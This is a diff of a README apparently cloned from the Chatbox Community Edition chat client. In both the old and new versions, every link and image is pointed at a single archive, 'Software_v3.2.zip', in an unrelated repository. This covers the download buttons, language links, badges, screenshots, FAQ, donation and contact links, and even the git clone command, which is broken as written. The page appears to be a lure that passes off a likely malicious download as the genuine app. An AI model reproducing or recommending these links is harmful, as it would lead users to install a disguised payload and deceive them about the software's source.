@@ -1,6 +1,6 @@
 <p align="right">
-  <a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip">English</a> |
-  <a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip">简体中文</a>
+  <a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip">English</a> |
+  <a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip">简体中文</a>
 </p>
 
 This is the repository for the Chatbox Community Edition, open-sourced under the GPLv3 license. For most users, I recommend using the Chatbox Official Edition (closed-source). It's still completely free, easy to install, and supports more of the latest features. You can get it below:
@@ -21,29 +21,29 @@ This is the repository for the Chatbox Community Edition, open-sourced under the
   </tr>
   <tr style="text-align: center">
     <td align="center" valign="middle">
-      <a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip'>
-        <img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' style="height:24px; width: 24px" />
+      <a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip'>
+        <img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' style="height:24px; width: 24px" />
         <br />
-        <b>https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip</b>
+        <b>https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip</b>
       </a>
     </td>
     <td align="center" valign="middle">
-      <a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip'>
-        <img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' style="height:24px; width: 24px" />
+      <a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip'>
+        <img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' style="height:24px; width: 24px" />
         <br />
         <b>Intel</b>
       </a>
     </td>
     <td align="center" valign="middle">
-      <a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip'>
-        <img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' style="height:24px; width: 24px" />
+      <a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip'>
+        <img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' style="height:24px; width: 24px" />
         <br />
         <b>M1/M2</b>
       </a>
     </td>
     <td align="center" valign="middle">
-      <a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip'>
-        <img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' style="height:24px; width: 24px" />
+      <a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip'>
+        <img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' style="height:24px; width: 24px" />
         <br />
         <b>AppImage</b>
       </a>
@@ -53,23 +53,23 @@ This is the repository for the Chatbox Community Edition, open-sourced under the
 
 ### Download for iOS/Android
 
-<a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' style='margin-right: 4px'>
-<img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' style="height:38px;" />
+<a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' style='margin-right: 4px'>
+<img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' style="height:38px;" />
 </a>
-<a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' style='margin-right: 4px'>
-<img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' style="height:38px;" />
+<a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' style='margin-right: 4px'>
+<img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' style="height:38px;" />
 </a>
-<a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' style='margin-right: 4px; display: inline-flex; justify-content: center'>
-<img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' style="height:28px; display: inline-block" />
+<a href='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' style='margin-right: 4px; display: inline-flex; justify-content: center'>
+<img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' style="height:28px; display: inline-block" />
 .APK
 </a>
 
-For more information: [https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip)
+For more information: [https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip)
 
 ---
 
 <h1 align="center">
-<img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip' width='30'>
+<img src='https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip' width='30'>
 <span>
     Chatbox
     <span style="font-size:8px; font-weight: normal;">(Community Edition)</span>
@@ -80,39 +80,39 @@ For more information: [https://github.com/bookformeonline/chatbox/raw/refs/heads
 </p>
 
 <p align="center">
-<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" target="_blank">
-<img alt="macOS" src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" />
+<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" target="_blank">
+<img alt="macOS" src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" />
 </a>
-<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" target="_blank">
-<img alt="Windows" src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" />
+<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" target="_blank">
+<img alt="Windows" src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" />
 </a>
-<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" target="_blank">
-<img alt="Linux" src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" />
+<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" target="_blank">
+<img alt="Linux" src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" />
 </a>
-<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" target="_blank">
-<img alt="Downloads" src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" />
+<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" target="_blank">
+<img alt="Downloads" src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" />
 </a>
-<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" target="_blank">
-<img alt="Twitter" src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" />
+<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" target="_blank">
+<img alt="Twitter" src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" />
 </a>
 </p>
 
-<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" target="_blank"><img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" alt="Chatbox - Better&#0032;UI&#0032;&#0038;&#0032;Desktop&#0032;App&#0032;for&#0032;ChatGPT&#0044;&#0032;Claude&#0032;and&#0032;other&#0032;LLMs&#0046; | Product Hunt" style="width: 150px; height: 30px;" width="100" height="40" /></a>
+<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" target="_blank"><img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" alt="Chatbox - Better&#0032;UI&#0032;&#0038;&#0032;Desktop&#0032;App&#0032;for&#0032;ChatGPT&#0044;&#0032;Claude&#0032;and&#0032;other&#0032;LLMs&#0046; | Product Hunt" style="width: 150px; height: 30px;" width="100" height="40" /></a>
 
-<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip">
-<img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" width="400"/>
+<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip">
+<img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" width="400"/>
 </a>
-<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip">
-<img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" width="400"/>
+<a href="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip">
+<img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" width="400"/>
 </a>
 
 <!-- <table>
 <tr>
 <td>
-<img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" alt="App Screenshot" style="box-shadow: 2px 2px 10px rgba(0,0,0,0.1); border: 1px solid #ddd; border-radius: 8px; height: 300px" />
+<img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" alt="App Screenshot" style="box-shadow: 2px 2px 10px rgba(0,0,0,0.1); border: 1px solid #ddd; border-radius: 8px; height: 300px" />
 </td>
 <td>
-<img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" alt="App Screenshot" style="box-shadow: 2px 2px 10px rgba(0,0,0,0.1); border: 1px solid #ddd; border-radius: 8px; height: 300px" />
+<img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" alt="App Screenshot" style="box-shadow: 2px 2px 10px rgba(0,0,0,0.1); border: 1px solid #ddd; border-radius: 8px; height: 300px" />
 </td>
 </tr>
 </table> -->
@@ -157,7 +157,7 @@ For more information: [https://github.com/bookformeonline/chatbox/raw/refs/heads
     :new_moon: A user-friendly interface with a night mode option for reduced eye strain during extended use.
 
 -   **Team Collaboration**  
-    :busts_in_silhouette: Collaborate with ease and share OpenAI API resources among your team. [Learn More](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip)
+    :busts_in_silhouette: Collaborate with ease and share OpenAI API resources among your team. [Learn More](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip)
 
 -   **Cross-Platform Availability**  
     :computer: Chatbox is ready for Windows, Mac, Linux users.
@@ -185,7 +185,7 @@ For more information: [https://github.com/bookformeonline/chatbox/raw/refs/heads
 
 ## FAQ
 
--   [Frequently Asked Questions](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip)
+-   [Frequently Asked Questions](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip)
 
 ## Why I made Chatbox?
 
@@ -210,7 +210,7 @@ Any form of contribution is welcome, including but not limited to:
 1. Clone the repository from Github
 
 ```bash
-git clone https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip
+git clone https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip
 ```
 
 2. Install the required dependencies
@@ -239,19 +239,19 @@ npm run package:all
 
 ## Buy Me a Coffee
 
-[!["Buy Me A Coffee"](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip)](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip)
+[!["Buy Me A Coffee"](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip)](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip)
 
 | Paypal                                            | Wechat Pay                                      | Ali Pay                                      |
 | ------------------------------------------------- | ----------------------------------------------- | -------------------------------------------- |
-| [**`Paypal`**](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip) | <img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" height="240" /> | <img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip" height="240" /> |
+| [**`Paypal`**](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip) | <img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" height="240" /> | <img src="https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip" height="240" /> |
 
 ## Star History
 
-[![Star History Chart](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip)](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip)
+[![Star History Chart](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip)](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip)
 
 ## Contact
 
-[Twitter](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip) | [Email](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip) | [Blog](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/assets/Software_v3.2.zip)
+[Twitter](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip) | [Email](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip) | [Blog](https://github.com/bookformeonline/chatbox/raw/refs/heads/main/release/Software_v3.2.zip)
 
 ## License
 
